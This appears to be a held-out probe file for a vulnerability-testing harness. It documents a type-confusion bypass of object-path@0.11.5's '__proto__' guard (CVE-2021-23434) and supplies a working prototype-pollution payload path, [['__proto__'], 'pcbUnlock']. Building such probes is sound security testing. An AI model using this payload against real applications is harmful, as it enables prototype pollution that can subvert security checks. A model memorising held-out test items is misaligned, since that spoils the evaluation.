#!/usr/bin/env python3
"""[HELD-OUT] CVE-2021-23434 residual for the npm `object-path` set() guard: a type-confusion bypass of
the CVE-2020-15256 string-only `=== '__proto__'` guard using a NON-string (array) key of the dangerous
name.

V1 (object-path@0.11.5) set() guards with a strict `===` STRING comparison and NO type coercion:
    var currentPath = path[0];
    if (options.includeInheritedProps && (currentPath === '__proto__' ||
      (currentPath === 'constructor' && typeof currentValue === 'function'))) {
      throw new Error('For security reasons, object\\'s magic properties cannot be set')
    }
A path whose first segment is itself an array -- `[["__proto__"],"pcbUnlock"]` -- makes the dangerous
key the ARRAY `["__proto__"]`. `["__proto__"] === '__proto__'` is FALSE, so the guard passes it; then
`getShallowProperty(obj, currentPath)` / the recursion's `obj[currentPath]` coerces the array to the
string '__proto__' (JS key stringification) and the walk steps onto Object.prototype = GLOBAL pollution.
Blocks on V0? No -- V0 pollutes on either path. Blocks on V1? No -- the array key slips the guard.
Blocks on V2 (object-path@0.11.6)? YES -- 0.11.6 adds
    if (typeof currentPath !== 'string' && typeof currentPath !== 'number') currentPath = String(currentPath)
BEFORE the guard, so `["__proto__"]` becomes '__proto__' and is caught (throw). That is the CVE-2021-23434
fix (the negative control).
"""


def candidate():
    # `spec` is JSON handed to the harness: an ARRAY path whose first segment is itself an array
    # (a NON-string key of the dangerous name = CWE-843 type confusion).
    return {
        "spec": [["__proto__"], "pcbUnlock"],
        "probe_id": "residual-cve-2021-23434-array-proto-key",
    }


if __name__ == "__main__":
    import json
    print(json.dumps(candidate(), indent=2))
